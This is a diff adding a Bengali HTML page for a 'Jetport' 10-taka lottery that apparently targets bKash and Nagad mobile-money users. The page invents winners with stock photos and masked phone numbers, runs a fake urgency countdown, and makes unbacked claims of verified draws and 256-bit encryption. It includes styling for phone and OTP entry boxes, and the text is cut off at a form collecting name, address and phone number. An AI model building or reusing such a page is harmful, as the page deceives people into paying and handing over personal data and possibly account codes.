@@ -1,0 +1,1270 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Jetport ৳220,000 – Official 3D Draw Portal</title>
+    <style>
+        :root {
+            --primary-gold: #f59e0b;
+            --dark-gold: #d97706;
+            --main-navy: #070f1e;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans Bengali', Roboto, sans-serif;
+            background: linear-gradient(135deg, #030712 0%, #1e1b4b 50%, #0f172a 100%);
+            color: #0f172a;
+            min-height: 100vh;
+            padding-bottom: 40px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .app-container {
+            max-width: 480px;
+            width: 100%;
+            background: #f8fafc;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+            position: relative;
+            min-height: 100vh;
+            overflow: hidden;
+            border-left: 1px solid rgba(255,255,255,0.15);
+            border-right: 1px solid rgba(255,255,255,0.15);
+        }
+
+        /* ===== রিয়েল থ্রিডি মোশন লাইভ টিকার ===== */
+        .live-ticker {
+            background: linear-gradient(90deg, #090d16, #1e293b, #090d16);
+            color: #38bdf8;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 9px 0;
+            white-space: nowrap;
+            overflow: hidden;
+            border-bottom: 2px solid rgba(245, 158, 11, 0.4);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+        }
+
+        .live-ticker marquee { display: block; }
+
+        /* ===== থ্রিডি গ্লেসি হেডার ===== */
+        .app-header {
+            background: linear-gradient(145deg, #090d16 0%, #1e1b4b 60%, #451a03 100%);
+            color: #fff;
+            padding: 24px 18px 32px;
+            border-bottom-left-radius: 40px;
+            border-bottom-right-radius: 40px;
+            box-shadow: 0 15px 35px rgba(245, 158, 11, 0.25);
+            position: relative;
+            border-bottom: 2px solid rgba(245, 158, 11, 0.5);
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #f59e0b, #b45309);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            color: #fff;
+            font-weight: 900;
+            box-shadow: 0 8px 25px rgba(245, 158, 11, 0.6);
+            border: 2px solid #fff;
+            animation: pulseGlow 2s infinite;
+        }
+
+        @keyframes pulseGlow {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.7); }
+            70% { transform: scale(1.06); box-shadow: 0 0 0 12px rgba(245, 158, 11, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
+        }
+
+        .brand-name {
+            font-size: 23px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
+        }
+
+        .brand-name span {
+            color: #030712;
+            background: #f59e0b;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 11px;
+            margin-left: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+        }
+
+        .countdown-title-top {
+            font-size: 13px;
+            font-weight: 900;
+            color: #fde047;
+            text-align: center;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .countdown-box {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1.5px solid rgba(245, 158, 11, 0.5);
+            border-radius: 18px;
+            padding: 12px;
+            display: flex;
+            justify-content: space-around;
+            text-align: center;
+            margin-bottom: 16px;
+            box-shadow: inset 0 4px 12px rgba(0,0,0,0.6), 0 8px 20px rgba(0,0,0,0.3);
+        }
+
+        .count-item span {
+            font-size: 19px;
+            font-weight: 900;
+            color: #fde047;
+            display: block;
+            text-shadow: 0 2px 6px rgba(0,0,0,0.6);
+        }
+
+        .count-item small {
+            font-size: 10px;
+            opacity: 0.85;
+            font-weight: 700;
+        }
+
+        .banner-info {
+            background: rgba(255, 255, 255, 0.12);
+            backdrop-filter: blur(12px);
+            border-radius: 18px;
+            padding: 14px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.25);
+        }
+
+        .banner-info h2 {
+            font-size: 17px;
+            font-weight: 900;
+            color: #fde047;
+            margin-bottom: 4px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.4);
+        }
+
+        .banner-info p {
+            font-size: 11.5px;
+            opacity: 0.95;
+            font-weight: 600;
+        }
+
+        /* ===== লোভনীয় অফার হাইলাইট ব্যানার ===== */
+        .luring-banner {
+            margin: 16px 16px 0;
+            background: linear-gradient(135deg, #fef3c7 0%, #fffbeb 100%);
+            border: 2px dashed #f59e0b;
+            border-radius: 16px;
+            padding: 12px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.15);
+        }
+
+        .luring-banner h4 {
+            color: #b45309;
+            font-size: 13.5px;
+            font-weight: 900;
+            margin-bottom: 3px;
+        }
+
+        .luring-banner p {
+            color: #78350f;
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        /* ===== বক্স ডিজাইন ===== */
+        .main-section-box {
+            margin: 16px;
+            background: #ffffff;
+            border: 1px solid #cbd5e1;
+            border-radius: 24px;
+            padding: 18px;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.06), 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+
+        .box-title-header {
+            font-size: 16px;
+            font-weight: 900;
+            color: #0f172a;
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .box-subtitle {
+            font-size: 11px;
+            color: #64748b;
+            margin-bottom: 14px;
+            border-bottom: 2px solid #f1f5f9;
+            padding-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .prize-row-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 8px;
+            border-bottom: 1px solid #f1f5f9;
+            font-size: 13px;
+        }
+
+        .prize-row-item:last-child { border-bottom: none; }
+
+        .prize-rank-badge {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
+            color: #b45309;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 12px;
+            border: 1.5px solid #f59e0b;
+            flex-shrink: 0;
+            margin-right: 10px;
+            box-shadow: 0 3px 8px rgba(245, 158, 11, 0.3);
+        }
+
+        .prize-desc {
+            flex: 1;
+            font-weight: 800;
+            color: #1e293b;
+            font-size: 13px;
+        }
+
+        .prize-amount-tag {
+            font-weight: 900;
+            color: #047857;
+            background: #ecfdf5;
+            padding: 4px 10px;
+            border-radius: 8px;
+            border: 1px solid #a7f3d0;
+            font-size: 11px;
+        }
+
+        .winner-row-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 8px;
+            border-bottom: 1px solid #f1f5f9;
+            font-size: 13px;
+        }
+
+        .winner-row-item:last-child { border-bottom: none; }
+
+        .winner-info-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .winner-real-pic {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #10b981;
+            box-shadow: 0 4px 10px rgba(16, 185, 129, 0.4);
+            flex-shrink: 0;
+        }
+
+        .winner-details-text div:first-child {
+            font-weight: 800;
+            color: #1e293b;
+            font-size: 13px;
+        }
+
+        .winner-details-text div:last-child {
+            font-size: 11px;
+            color: #64748b;
+            font-weight: 600;
+        }
+
+        .winner-won-badge {
+            font-weight: 900;
+            color: #047857;
+            background: #ecfdf5;
+            padding: 5px 10px;
+            border-radius: 8px;
+            border: 1px solid #a7f3d0;
+            font-size: 11px;
+            text-align: right;
+        }
+
+        .info-card-box {
+            background: linear-gradient(135deg, #f8fafc, #eff6ff);
+            border: 1.5px solid #bfdbfe;
+            border-radius: 18px;
+            padding: 14px;
+            margin: 16px;
+            box-shadow: 0 6px 15px rgba(0,0,0,0.03);
+        }
+
+        .info-card-title {
+            font-size: 13px;
+            font-weight: 900;
+            color: #1e40af;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .info-card-text {
+            font-size: 11.5px;
+            color: #334155;
+            line-height: 1.5;
+            font-weight: 600;
+        }
+
+        .action-footer-box {
+            padding: 10px 16px 22px;
+            text-align: center;
+        }
+
+        .main-claim-btn {
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 17px;
+            border-radius: 18px;
+            font-size: 17px;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 12px 30px rgba(245, 158, 11, 0.55), inset 0 2px 5px rgba(255,255,255,0.4);
+            letter-spacing: 0.5px;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            animation: pulseBtn 2s infinite;
+        }
+
+        @keyframes pulseBtn {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.7); }
+            50% { transform: scale(1.02); box-shadow: 0 0 0 14px rgba(245, 158, 11, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
+        }
+
+        .main-claim-btn:active { transform: scale(0.97); }
+
+        .trust-section {
+            margin: 0 16px 15px;
+            background: #ffffff;
+            border: 1px solid #cbd5e1;
+            border-radius: 16px;
+            padding: 12px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+        }
+
+        .trust-title {
+            font-size: 11px;
+            color: #64748b;
+            font-weight: 800;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .payment-logos {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            font-size: 11px;
+            font-weight: 800;
+            color: #334155;
+        }
+
+        .pay-badge {
+            background: #f8fafc;
+            padding: 5px 10px;
+            border-radius: 8px;
+            border: 1px solid #cbd5e1;
+        }
+
+        .gateway-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .gateway-card {
+            border: 2px solid #cbd5e1;
+            border-radius: 16px;
+            padding: 14px 10px;
+            text-align: center;
+            cursor: pointer;
+            background: #ffffff;
+            transition: all 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 6px 15px rgba(0,0,0,0.04);
+        }
+
+        .gateway-card.selected {
+            border-color: #f59e0b;
+            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
+            box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.3), 0 10px 20px rgba(245, 158, 11, 0.15);
+            transform: scale(1.02);
+        }
+
+        .gateway-card img {
+            width: 52px;
+            height: 52px;
+            object-fit: contain;
+            border-radius: 10px;
+            background: #fff;
+            padding: 4px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .gateway-card .gw-name {
+            font-size: 14px;
+            font-weight: 900;
+        }
+
+        /* ফর্ম স্টাইল */
+        .form-group {
+            margin-bottom: 12px;
+            text-align: left;
+        }
+
+        .form-group label {
+            font-size: 12px;
+            font-weight: 800;
+            color: #0f172a;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            background: #f8fafc;
+            border: 2px solid #cbd5e1;
+            border-radius: 12px;
+            padding: 10px 12px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #0f172a;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            border-color: #f59e0b;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(245, 158, 11, 0.2);
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+
+        .shake-anim {
+            animation: shake 0.4s ease-in-out;
+            border-color: #ef4444 !important;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(3, 7, 18, 0.88);
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.active { opacity: 1; pointer-events: auto; }
+
+        .modal-card {
+            background: #ffffff;
+            width: 92%;
+            max-width: 380px;
+            border-radius: 30px;
+            padding: 26px 20px;
+            text-align: center;
+            transform: scale(0.8);
+            transition: transform 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.6);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .modal-overlay.active .modal-card { transform: scale(1); }
+
+        .modal-badge-icon {
+            width: 65px; height: 65px;
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            margin: 0 auto 14px;
+            border: 2px solid #f59e0b;
+            box-shadow: 0 8px 20px rgba(245, 158, 11, 0.4);
+            animation: bounceIcon 1.5s infinite;
+        }
+
+        @keyframes bounceIcon {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-7px); }
+        }
+
+        .modal-title-3d {
+            font-size: 20px;
+            font-weight: 900;
+            line-height: 1.35;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            background: linear-gradient(135deg, #2563eb 0%, #1e40af 50%, #9333ea 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 8px rgba(37, 99, 235, 0.2);
+            padding: 0 4px;
+        }
+
+        .modal-desc-text {
+            font-size: 13px;
+            color: #64748b;
+            margin-bottom: 18px;
+            line-height: 1.5;
+            font-weight: 600;
+        }
+
+        .phone-input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #cbd5e1;
+            border-radius: 16px;
+            background: #f8fafc;
+            padding: 8px 12px;
+            margin-bottom: 12px;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        .phone-input-wrapper:focus-within {
+            border-color: #f59e0b;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(245, 158, 11, 0.2);
+        }
+
+        .phone-input-wrapper input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 8px 10px;
+            font-size: 17px;
+            font-weight: 800;
+            color: #0f172a;
+            outline: none;
+            letter-spacing: 1.5px;
+        }
+
+        .otp-boxes-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .otp-box {
+            width: 44px; height: 50px;
+            border: 2px solid #cbd5e1;
+            border-radius: 12px;
+            background: #f8fafc;
+            font-size: 22px;
+            font-weight: 900;
+            color: #0f172a;
+            text-align: center;
+            outline: none;
+        }
+
+        .otp-box:focus {
+            border-color: #f59e0b;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(245, 158, 11, 0.2);
+        }
+
+        .modal-action-btn {
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 15px;
+            border-radius: 16px;
+            font-weight: 900;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(245, 158, 11, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: transform 0.15s ease;
+        }
+
+        .modal-action-btn:active { transform: scale(0.97); }
+
+        .timer-text {
+            font-size: 12px;
+            color: #d97706;
+            font-weight: 800;
+            margin-bottom: 14px;
+            background: #fffbeb;
+            padding: 6px 14px;
+            border-radius: 20px;
+            display: inline-block;
+            border: 1px solid #fde68a;
+        }
+
+        .loader-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 25px 0 15px;
+        }
+
+        .pro-spinner {
+            width: 55px; height: 55px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pro-spinner .ring {
+            position: absolute;
+            width: 100%; height: 100%;
+            border: 4px solid rgba(245, 158, 11, 0.2);
+            border-top-color: #f59e0b;
+            border-radius: 50%;
+            animation: spinRing 0.8s linear infinite;
+        }
+
+        @keyframes spinRing {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-text {
+            margin-top: 16px;
+            font-size: 15px;
+            color: #0f172a;
+            font-weight: 800;
+        }
+
+        .ticket-receipt-box {
+            background: linear-gradient(135deg, #fffbeb, #fef3c7);
+            border: 2px dashed #f59e0b;
+            border-radius: 16px;
+            padding: 16px;
+            text-align: left;
+            margin-bottom: 15px;
+            font-size: 12.5px;
+            color: #78350f;
+            line-height: 1.6;
+            box-shadow: inset 0 2px 6px rgba(0,0,0,0.03);
+        }
+
+        .app-footer {
+            text-align: center;
+            padding: 22px 16px;
+            font-size: 11px;
+            color: #94a3b8;
+            border-top: 1px solid #e2e8f0;
+            margin-top: 12px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+
+    <!-- ===== রিয়েল থ্রিডি মোশন লাইভ টিকার ===== -->
+    <div class="live-ticker">
+        <marquee scrollamount="4">🔥 ১০০% ভেরিফাইড ড্র! • কুষ্টিয়া থেকে রহিম ভাই ৳২২০,০০০ গ্র্যান্ড ক্যাশ রিসিভ করেছেন! • ঢাকা থেকে সাব্বির আহমেদ আইফোন ১৬ প্রো ম্যাক্স জিতেছেন! • আজ ইতিমধ্যে ৪,৫১২ জন টিকিট কিনেছেন!</marquee>
+    </div>
+
+    <!-- ===== থ্রিডি গ্লেসি হেডার (Jetport) ===== -->
+    <div class="app-header">
+        <div class="top-bar">
+            <div class="brand-logo">
+                <div class="logo-icon">🚀</div>
+                <div class="brand-name">Jetport <span>VIP</span></div>
+            </div>
+        </div>
+
+        <div class="countdown-title-top">⏳ ড্র শুরু হতে মাত্র বাকি: <span id="timeRemainingText">০৪ ঘণ্টা</span></div>
+
+        <div class="countdown-box">
+            <div class="count-item"><span id="hours">03</span><small>ঘণ্টা</small></div>
+            <div class="count-item"><span>:</span></div>
+            <div class="count-item"><span id="mins">59</span><small>মিনিট</small></div>
+            <div class="count-item"><span>:</span></div>
+            <div class="count-item"><span id="secs">45</span><small>সেকেন্ড</small></div>
+        </div>
+
+        <div class="banner-info">
+            <h2>🏆 জেটপোর্ট মেগা লাকি ড্র পোর্টাল</h2>
+            <p>মাত্র ১০ টাকায় টিকিট কিনে জিতে নিন ২২,২০,০০০ টাকার মেগা প্রাইজ পুল!</p>
+        </div>
+    </div>
+
+    <!-- ===== লোভনীয় হাইলাইট অফার ব্যানার ===== -->
+    <div class="luring-banner">
+        <h4>⚡ সুবর্ণ সুযোগ: মাত্র ১০ টাকায় ভাগ্য বদলান!</h4>
+        <p>যত বেশি টিকিট কিনবেন, বিজয়ী হওয়ার সম্ভাবনা তত শতভাগ বেড়ে যাবে! আজ রাতেই লাইভ ড্র ও ইনস্ট্যান্ট বিকাশ/নগদে ক্যাশআউট।</p>
+    </div>
+
+    <!-- ===== টিকিট ইনফো ও উইনার রুলস ===== -->
+    <div class="info-card-box">
+        <div class="info-card-title">ℹ️ টিকিট ইনফো ও উইনার রুলস:</div>
+        <div class="info-card-text">
+            • <b>রেজিস্ট্রেশন ফর্ম:</b> টিকিট কেনার জন্য প্রথমে আপনার নাম, সঠিক ঠিকানা ও মোবাইল নম্বর দিয়ে ফর্ম পূরণ করতে হবে।<br>
+            • <b>বিজয়ী ঘোষণা পদ্ধতি:</b> কাউন্টডাউন শেষ হওয়ার পর অটোমেটেড সিস্টেমের মাধ্যমে র‍্যান্ডম ড্র করে বিজয়ী নির্বাচন করা হবে। বিজয়ীদের নাম এই পোর্টালে লাইভ আপডেট করা হবে এবং সরাসরি তাদের নম্বরে পুরস্কার পৌঁছে দেওয়া হবে।
+        </div>
+    </div>
+
+    <!-- ===== পুরস্কারের তালিকা (৳২২০,০০০) ===== -->
+    <div class="main-section-box" style="background: linear-gradient(180deg, #ffffff 0%, #f8fafc 100%);">
+        <div class="box-title-header">
+            <span>🎁 জেটপোর্ট প্রাইজ পুল (৳২২০,০০০)</span>
+            <span style="font-size: 11px; color: #ffffff; background: linear-gradient(135deg, #d97706, #b45309); padding: 4px 10px; border-radius: 20px; font-weight: 800; box-shadow: 0 2px 6px rgba(217, 119, 6, 0.3);">এন্ট্রি ফি: ৳১০</span>
+        </div>
+        <div class="box-subtitle">১ম থেকে ১০ম স্থান পর্যন্ত নির্ধারিত আকর্ষণীয় পুরস্কারসমূহ:</div>
+
+        <div class="prize-row-item" style="background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%); border: 1.5px solid #f59e0b; border-radius: 14px; margin-bottom: 8px; padding: 12px 10px;">
+            <div style="display:flex; align-items:center;">
+                <div class="prize-rank-badge" style="background: linear-gradient(135deg, #f59e0b, #b45309); color: #fff; border: none; font-size: 14px;">🥇</div>
+                <div class="prize-desc">
+                    <div style="color: #92400e; font-size: 14px;">১ম পুরস্কার: ৳২২০,০০০ মেগা ক্যাশ</div>
+                    <div style="font-size: 10px; color: #b45309; font-weight: 600;">সরাসরি ব্যাংক বা বিকাশ/নগদে ট্রান্সফার</div>
+                </div>
+            </div>
+            <div class="prize-amount-tag" style="background: #fef3c7; border-color: #f59e0b; color: #92400e;">★ গ্র্যান্ড প্রাইজ</div>
+        </div>
+
+        <div class="prize-row-item" style="background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 12px; margin-bottom: 8px;">
+            <div style="display:flex; align-items:center;">
+                <div class="prize-rank-badge" style="background: linear-gradient(135deg, #e2e8f0, #94a3b8); color: #0f172a; border: none; font-size: 14px;">🥈</div>
+                <div class="prize-desc">
+                    <div>২য় পুরস্কার: iPhone 16 Pro Max</div>
+                    <div style="font-size: 10px; color: #64748b; font-weight: 600;">256GB • অফিশিয়াল ওয়ারেন্টিসহ</div>
+                </div>
+            </div>
+            <div class="prize-amount-tag">✓ ইন-স্টক</div>
+        </div>
+
+        <div class="prize-row-item" style="background: #fff7ed; border: 1px solid #fed7aa; border-radius: 12px; margin-bottom: 8px;">
+            <div style="display:flex; align-items:center;">
+                <div class="prize-rank-badge" style="background: linear-gradient(135deg, #fdba74, #c2410c); color: #fff; border: none; font-size: 14px;">🥉</div>
+                <div class="prize-desc">
+                    <div>৩য় পুরস্কার: ৳৮০,০০০ নগদ ক্যাশ</div>
+                    <div style="font-size: 10px; color: #9a3412; font-weight: 600;">ইনস্ট্যান্ট ক্যাশআউট সুবিধা</div>
+                </div>
+            </div>
+            <div class="prize-amount-tag">✓ ভেরিফাইড</div>
+        </div>
+
+        <div class="prize-row-item"><div style="display:flex; align-items:center;"><div class="prize-rank-badge">4</div><div class="prize-desc">৪র্থ পুরস্কার: ৳৫০,০০০ ক্যাশ প্রাইজ</div></div><div class="prize-amount-tag">✓ ভেরিফাইড</div></div>
+        <div class="prize-row-item"><div style="display:flex; align-items:center;"><div class="prize-rank-badge">5</div><div class="prize-desc">৫ম পুরস্কার: Walton 43" 4K Smart TV</div></div><div class="prize-amount-tag">✓ হোম ডেলিভারি</div></div>
+        <div class="prize-row-item"><div style="display:flex; align-items:center;"><div class="prize-rank-badge">6</div><div class="prize-desc">৬ষ্ঠ পুরস্কার: ৳২৫,০০০ নগদ ক্যাশ</div></div><div class="prize-amount-tag">✓ ভেরিফাইড</div></div>
+        <div class="prize-row-item"><div style="display:flex; align-items:center;"><div class="prize-rank-badge">7</div><div class="prize-desc">৭ম পুরস্কার: ৳১৫,০০০ নগদ ক্যাশ</div></div><div class="prize-amount-tag">✓ ভেরিফাইড</div></div>
+        <div class="prize-row-item"><div style="display:flex; align-items:center;"><div class="prize-rank-badge">8</div><div class="prize-desc">৮ম পুরস্কার: Smart Watch & Earbuds কম্বো</div></div><div class="prize-amount-tag">✓ গিফট বক্স</div></div>
+        <div class="prize-row-item"><div style="display:flex; align-items:center;"><div class="prize-rank-badge">9</div><div class="prize-desc">৯ম পুরস্কার: ৳১০,০০০ নগদ ক্যাশ</div></div><div class="prize-amount-tag">✓ ভেরিফাইড</div></div>
+        <div class="prize-row-item"><div style="display:flex; align-items:center;"><div class="prize-rank-badge">10</div><div class="prize-desc">১০ম পুরস্কার: ৳৫,০০০ ক্যাশ বোনাস</div></div><div class="prize-amount-tag">✓ ভেরিফাইড</div></div>
+    </div>
+
+    <!-- ===== টিকিট কেনার বাটন ও কাউন্টার ===== -->
+    <div class="action-footer-box">
+        <div style="margin-bottom: 12px; font-size: 13px; font-weight: 800; color: #38bdf8; background: rgba(15, 23, 42, 0.85); padding: 9px; border-radius: 14px; border: 1px solid rgba(56, 189, 248, 0.35);">
+            🎟️ আপনার কেনা মোট টিকিট: <span id="totalTicketsCount" style="color: #fde047; font-size: 15px;">০ টি</span>
+        </div>
+        <button class="main-claim-btn" onclick="openDetailsForm()">🎫 এখনই টিকিট কিনুন (মাত্র ১০ টাকা)</button>
+    </div>
+
+    <!-- ===== বিজয়ীগণের তালিকা (গতকালকের বিজয়ী অটো-ডেট) ===== -->
+    <div class="main-section-box" style="margin-top: 0;">
+        <div class="box-title-header">
+            <span>🏆 সফল বিজয়ীগণ</span>
+            <span id="yesterdayDateBadge" style="font-size: 11px; background: #ecfdf5; color: #047857; padding: 4px 10px; border-radius: 8px; font-weight: 800; border: 1px solid #10b981;">তারিখ: লোড হচ্ছে...</span>
+        </div>
+        <div class="box-subtitle" id="yesterdaySubtitleText">গতকালকের ড্র-এ যারা ইতিমধ্যে প্রাইজ উইন করেছেন ও পেমেন্ট পেয়েছেন:</div>
+
+        <div class="winner-row-item">
+            <div class="winner-info-group">
+                <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=120&auto=format&fit=crop&q=80" alt="Winner" class="winner-real-pic">
+                <div class="winner-details-text">
+                    <div>রহিম মিয়া (কুষ্টিয়া)</div>
+                    <div>017******** • বিকাশ ক্যাশআউট</div>
+                </div>
+            </div>
+            <div class="winner-won-badge">৳২২০,০০০ জেতেছেন</div>
+        </div>
+
+        <div class="winner-row-item">
+            <div class="winner-info-group">
+                <img src="https://images.unsplash.com/photo-1570295999919-56ceb5ecca61?w=120&auto=format&fit=crop&q=80" alt="Winner" class="winner-real-pic">
+                <div class="winner-details-text">
+                    <div>সাব্বির আহমেদ (ঢাকা)</div>
+                    <div>018******** • নগদ ক্যাশআউট</div>
+                </div>
+            </div>
+            <div class="winner-won-badge">আইফোন ১৬ জেতেছেন</div>
+        </div>
+
+        <div class="winner-row-item">
+            <div class="winner-info-group">
+                <img src="https://images.unsplash.com/photo-1527980965255-d3b416303d12?w=120&auto=format&fit=crop&q=80" alt="Winner" class="winner-real-pic">
+                <div class="winner-details-text">
+                    <div>তানভীর হাসান (রাজশাহী)</div>
+                    <div>019******** • বিকাশ ক্যাশআউট</div>
+                </div>
+            </div>
+            <div class="winner-won-badge">৳৮০,০০০ জেতেছেন</div>
+        </div>
+
+        <div class="winner-row-item">
+            <div class="winner-info-group">
+                <img src="https://images.unsplash.com/photo-1580489944761-15a19d654956?w=120&auto=format&fit=crop&q=80" alt="Winner" class="winner-real-pic">
+                <div class="winner-details-text">
+                    <div>শরিফুল ইসলাম (বগুড়া)</div>
+                    <div>013******** • বিকাশ রিসিভড</div>
+                </div>
+            </div>
+            <div class="winner-won-badge">৳৫০,০০০ জেতেছেন</div>
+        </div>
+
+        <div class="winner-row-item">
+            <div class="winner-info-group">
+                <img src="https://images.unsplash.com/photo-1633332755192-727a05c4013d?w=120&auto=format&fit=crop&q=80" alt="Winner" class="winner-real-pic">
+                <div class="winner-details-text">
+                    <div>আরিফ হোসেন (সিলেট)</div>
+                    <div>016******** • নগদ রিসিভড</div>
+                </div>
+            </div>
+            <div class="winner-won-badge">স্মার্ট টিভি জিতেছেন</div>
+        </div>
+    </div>
+
+    <!-- ===== ট্রাস্ট ব্যাজ ===== -->
+    <div class="trust-section">
+        <div class="trust-title">স্বীকৃত ও নিরাপদ পেমেন্ট গেটওয়ে</div>
+        <div class="payment-logos">
+            <span class="pay-badge">bKash</span>
+            <span class="pay-badge">Nagad</span>
+        </div>
+    </div>
+
+    <!-- ===== ফুটার ===== -->
+    <div class="app-footer">
+        © 2026 Jetport Draw Portal. All Rights Reserved.<br>
+        🔒 Secure 256-bit Encrypted Connection
+    </div>
+
+</div>
+
+<!-- ===== মডাল ও ফর্ম সিস্টেম ===== -->
+<div class="modal-overlay" id="appModal">
+    <div class="modal-card">
+        
+        <!-- ১. লোডিং -->
+        <div class="loader-container" id="modalLoader">
+            <div class="pro-spinner">
+                <div class="ring"></div>
+            </div>
+            <div class="loader-text" id="loaderText">পেমেন্ট গেটওয়ে লোড হচ্ছে...</div>
+        </div>
+
+        <!-- ২. টিকিট কেনার তথ্য ফর্ম (নাম, ঠিকানা, নম্বর) -->
+        <div id="detailsFormStep" style="display: none;">
+            <div class="modal-badge-icon">📝</div>
+            <div class="modal-title-3d">জেটপোর্ট টিকিট ফর্ম</div>
+            <div class="modal-desc-text">আপনার সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন:</div>
+            
+            <div class="form-group" id="nameGroup">
+                <label>আপনার পূর্ণ নাম:</label>
